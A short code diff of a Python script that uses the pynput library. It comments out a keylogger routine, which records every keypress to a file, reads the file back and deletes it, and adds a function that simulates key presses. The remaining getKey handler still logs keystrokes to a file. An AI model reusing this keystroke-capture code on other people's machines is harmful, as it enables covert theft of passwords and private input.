@@ -1,5 +1,4 @@
-from pynput.keyboard import Listener
-import os
+from pynput.keyboard import Listener,Key, Controller
 
 
 def getKey(key):
@@ -16,18 +15,27 @@ def getKey(key):
     
     with open("KeyLog.txt","a") as file:
         file.write(key)
-    #print(key)
+    
+# with  Listener(on_press = getKey) as listener:
+#     listener.join()
 
-def Key_Log():
-    with Listener(on_press = getKey) as listener:
-        listener.join()
 
-    key_log_string=""
+# def Key_Log():
+#     
+#         listener.join()
 
-    with open("KeyLog.txt","r") as file:
-        key_log_string=file.read()
-    os.remove("KeyLog.txt")
-    return key_log_string
+#     key_log_string=""
+
+#     with open("KeyLog.txt","r") as file:
+#         key_log_string=file.read()
+#     os.remove("KeyLog.txt")
+#     return key_log_string
+
+def Key_press(key):
+    Keyboard = Controller()
+    Keyboard.press(key)
+    # Keyboard.release(key)
+
 
 
 
